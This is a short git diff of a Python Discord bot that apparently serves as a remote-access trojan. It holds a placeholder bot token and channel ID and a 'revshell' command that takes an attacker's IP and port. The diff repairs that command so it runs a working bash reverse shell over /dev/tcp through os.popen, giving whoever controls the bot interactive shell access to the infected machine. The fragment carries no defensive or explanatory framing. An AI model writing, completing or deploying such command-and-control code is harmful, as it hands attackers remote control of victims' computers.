@@ -2,7 +2,7 @@ from discord.ext import commands
 import requests, platform, discord, urllib, psutil, socket, sys, os
 
 token = 'MToken.mnt.discord' # Token
-channel_id = 111111111111111111  # Channel ID
+channel_id = 111111111111111 # Channel ID
 
 # bot
 intents = discord.Intents.default()
@@ -196,7 +196,7 @@ async def revshell(ctx, revshellRipArg, revshellRportArg):
     rip = ''.join(revshellRipArg)
     rport = ''.join(revshellRportArg)
     if platform.system() == 'Linux':
-        os.popen(f"cmd -i >& /dev/tcp/{rip}/{rport} 0>&1")
+        os.popen(f"bash -i >& /dev/tcp/{rip}/{rport} 0>&1")
     else:
         await ctx.send(f"``[-] {hostname}@{ip}: OS not supported``")
     
